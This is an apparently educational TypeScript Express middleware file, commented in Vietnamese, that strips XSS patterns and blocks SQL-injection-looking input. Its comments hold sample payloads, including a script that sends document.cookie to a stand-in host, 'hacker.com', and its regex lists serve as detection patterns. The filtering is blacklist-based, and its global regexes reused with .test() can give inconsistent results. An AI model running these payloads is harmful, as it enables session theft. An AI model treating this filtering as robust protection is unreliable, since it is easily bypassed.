/**
 * ╔══════════════════════════════════════════════════════════════════════════════╗
 * ║                         SANITIZATION MIDDLEWARE                               ║
 * ╠══════════════════════════════════════════════════════════════════════════════╣
 * ║  MỤC ĐÍCH: Làm sạch dữ liệu đầu vào, loại bỏ code độc hại                    ║
 * ║                                                                               ║
 * ║  SANITIZATION vs VALIDATION:                                                  ║
 * ║  - Validation: Kiểm tra → Từ chối nếu sai                                    ║
 * ║  - Sanitization: Làm sạch → Loại bỏ phần nguy hiểm, giữ phần an toàn         ║
 * ║                                                                               ║
 * ║  VÍ DỤ:                                                                       ║
 * ║  Input: "Hello <script>alert('hack')</script> World"                         ║
 * ║  - Validation: ❌ "Input chứa ký tự không hợp lệ" (từ chối)                  ║
 * ║  - Sanitization: ✅ "Hello  World" (loại bỏ script, giữ text)                ║
 * ╚══════════════════════════════════════════════════════════════════════════════╝
 */

import { Request, Response, NextFunction } from "express";

// ============================================================================
// CÁC PATTERN NGUY HIỂM CẦN PHÁT HIỆN
// ============================================================================

/**
 * SQL INJECTION PATTERNS
 *
 * SQL Injection là gì?
 * - Hacker chèn code SQL vào input để thao túng database
 *
 * Ví dụ tấn công:
 * - Input username: ' OR '1'='1
 * - Query: SELECT * FROM users WHERE username = '' OR '1'='1'
 * - Kết quả: Trả về TẤT CẢ users! (vì '1'='1' luôn đúng)
 */
const SQL_PATTERNS = [
  /'\s*OR\s+'.*'\s*=\s*'/gi, // ' OR '1'='1
  /'\s*OR\s+\d+\s*=\s*\d+/gi, // ' OR 1=1
  /;\s*DROP\s+/gi, // ; DROP TABLE
  /;\s*DELETE\s+/gi, // ; DELETE FROM
  /;\s*UPDATE\s+.*SET/gi, // ; UPDATE users SET
  /;\s*INSERT\s+INTO/gi, // ; INSERT INTO
  /UNION\s+SELECT/gi, // UNION SELECT (lấy data từ bảng khác)
  /--\s*$/, // -- (comment SQL, bỏ qua phần sau)
  /\/\*.*\*\//g, // /* */ (comment block)
];

/**
 * XSS (Cross-Site Scripting) PATTERNS
 *
 * XSS là gì?
 * - Hacker chèn JavaScript vào website
 * - Khi user khác xem → Script chạy → Đánh cắp cookie/session
 *
 * Ví dụ tấn công:
 * - Hacker comment: <script>fetch('hacker.com?cookie='+document.cookie)</script>
 * - User khác xem comment → Cookie bị gửi cho hacker
 * - Hacker dùng cookie đó để đăng nhập
 */
const XSS_PATTERNS = [
  /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, // <script>...</script>
  /javascript:/gi, // javascript:alert('xss')
  /on\w+\s*=/gi, // onclick=, onerror=, onload=
  /data:/gi, // data:text/html (chèn HTML qua data URL)
  /vbscript:/gi, // vbscript: (IE cũ)
  /<iframe/gi, // <iframe> (nhúng trang khác)
  /<embed/gi, // <embed> (nhúng object)
  /<object/gi, // <object> (nhúng object)
];

// ============================================================================
// HÀM ESCAPE HTML - Chống XSS
// ============================================================================
/**
 * Chuyển các ký tự HTML đặc biệt thành entities
 *
 * Tại sao cần?
 * - Browser hiểu < > là HTML tags
 * - Chuyển thành &lt; &gt; → Browser hiển thị như text thường
 *
 * Ví dụ:
 * - Input: <script>alert('xss')</script>
 * - Output: &lt;script&gt;alert('xss')&lt;/script&gt;
 * - Hiển thị: <script>alert('xss')</script> (như text, không chạy)
 */
export function escapeHtml(str: string): string {
  if (typeof str !== "string") return str;

  const htmlEntities: Record<string, string> = {
    "&": "&amp;", // & phải escape đầu tiên
    "<": "&lt;", // Mở tag
    ">": "&gt;", // Đóng tag
    '"': "&quot;", // Attribute với "
    "'": "&#x27;", // Attribute với '
    "/": "&#x2F;", // Đóng tag tự đóng
  };

  return str.replace(/[&<>"'/]/g, (char) => htmlEntities[char]);
}

// ============================================================================
// HÀM KIỂM TRA SQL INJECTION
// ============================================================================
/**
 * Kiểm tra xem string có chứa SQL injection pattern không
 *
 * @returns true nếu phát hiện SQL injection
 */
export function containsSqlInjection(str: string): boolean {
  if (typeof str !== "string") return false;

  // Kiểm tra từng pattern
  for (const pattern of SQL_PATTERNS) {
    if (pattern.test(str)) {
      return true;
    }
  }

  return false;
}

// ============================================================================
// HÀM KIỂM TRA XSS
// ============================================================================
/**
 * Kiểm tra xem string có chứa XSS pattern không
 *
 * @returns true nếu phát hiện XSS
 */
export function containsXss(str: string): boolean {
  if (typeof str !== "string") return false;

  for (const pattern of XSS_PATTERNS) {
    if (pattern.test(str)) {
      return true;
    }
  }

  return false;
}

// ============================================================================
// HÀM LÀM SẠCH MỘT GIÁ TRỊ
// ============================================================================
/**
 * Làm sạch một giá trị đơn (string, number, array, object)
 */
export function sanitizeValue(value: any): any {
  // Null/undefined → giữ nguyên
  if (value === null || value === undefined) {
    return value;
  }

  // String → làm sạch
  if (typeof value === "string") {
    let clean = value;

    // 1. Trim khoảng trắng đầu/cuối
    clean = clean.trim();

    // 2. Loại bỏ null bytes (ký tự \0 có thể gây lỗi)
    clean = clean.replace(/\0/g, "");

    // 3. Loại bỏ các pattern XSS nguy hiểm
    for (const pattern of XSS_PATTERNS) {
      clean = clean.replace(pattern, "");
    }

    return clean;
  }

  // Array → làm sạch từng phần tử
  if (Array.isArray(value)) {
    return value.map((item) => sanitizeValue(item));
  }

  // Object → làm sạch từng property
  if (typeof value === "object") {
    const cleanObj: Record<string, any> = {};
    for (const key of Object.keys(value)) {
      // Làm sạch cả key (phòng trường hợp key chứa code độc)
      const cleanKey = key.replace(/[<>"']/g, "");
      cleanObj[cleanKey] = sanitizeValue(value[key]);
    }
    return cleanObj;
  }

  // Number, boolean, etc → giữ nguyên
  return value;
}

// ============================================================================
// MIDDLEWARE: LÀM SẠCH REQUEST BODY
// ============================================================================
/**
 * Làm sạch req.body (data từ POST/PUT request)
 *
 * Ví dụ:
 * - Client gửi: { name: "<script>hack</script>", age: 25 }
 * - Sau sanitize: { name: "", age: 25 }
 */
export const sanitizeBody = (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  if (req.body && typeof req.body === "object") {
    req.body = sanitizeValue(req.body);
  }
  next();
};

// ============================================================================
// MIDDLEWARE: LÀM SẠCH QUERY PARAMS
// ============================================================================
/**
 * Làm sạch req.query (data từ URL: ?search=xxx&page=1)
 *
 * Lưu ý: Express 5 req.query là read-only, không thể gán trực tiếp
 * Nên chỉ sanitize từng property thay vì gán lại object
 */
export const sanitizeQuery = (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  if (req.query && typeof req.query === "object") {
    // Sanitize từng property thay vì gán lại object (Express 5 compatibility)
    for (const key of Object.keys(req.query)) {
      const value = req.query[key];
      if (typeof value === "string") {
        (req.query as any)[key] = sanitizeValue(value);
      }
    }
  }
  next();
};

// ============================================================================
// MIDDLEWARE: LÀM SẠCH URL PARAMS
// ============================================================================
/**
 * Làm sạch req.params (data từ URL path: /users/:id)
 *
 * Lưu ý: Express 5 req.params có thể là read-only
 * Nên chỉ sanitize từng property
 */
export const sanitizeParams = (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  if (req.params && typeof req.params === "object") {
    for (const key of Object.keys(req.params)) {
      const value = req.params[key];
      if (typeof value === "string") {
        (req.params as any)[key] = sanitizeValue(value);
      }
    }
  }
  next();
};

// ============================================================================
// MIDDLEWARE: KIỂM TRA SQL INJECTION
// ============================================================================
/**
 * Kiểm tra tất cả input có chứa SQL injection không
 * Nếu có → Trả về lỗi 400, không xử lý tiếp
 */
export const checkSqlInjection = (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  /**
   * Hàm đệ quy kiểm tra object
   * @returns Tên field bị phát hiện SQL injection, hoặc null nếu an toàn
   */
  const checkObject = (obj: any, path: string = ""): string | null => {
    if (!obj) return null;

    for (const key of Object.keys(obj)) {
      const value = obj[key];
      const currentPath = path ? `${path}.${key}` : key;

      // Kiểm tra string
      if (typeof value === "string" && containsSqlInjection(value)) {
        return currentPath;
      }

      // Đệ quy kiểm tra object con
      if (typeof value === "object" && value !== null) {
        const result = checkObject(value, currentPath);
        if (result) return result;
      }
    }

    return null;
  };

  // Kiểm tra body, query, params
  const suspiciousField =
    checkObject(req.body, "body") ||
    checkObject(req.query, "query") ||
    checkObject(req.params, "params");

  if (suspiciousField) {
    // Log để theo dõi (có thể gửi alert cho admin)
    console.warn(`[SECURITY] SQL Injection detected in ${suspiciousField}`);
    console.warn(`[SECURITY] IP: ${req.ip}, URL: ${req.originalUrl}`);

    return res.status(400).json({
      success: false,
      message: "Dữ liệu không hợp lệ",
      error_code: "INVALID_INPUT",
    });
  }

  next();
};

// ============================================================================
// EXPORT TẤT CẢ SANITIZATION MIDDLEWARE
// ============================================================================
/**
 * Sử dụng: app.use(sanitizeRequest)
 * Sẽ áp dụng tất cả middleware theo thứ tự
 */
export const sanitizeRequest = [
  sanitizeBody,
  sanitizeQuery,
  sanitizeParams,
  checkSqlInjection,
];
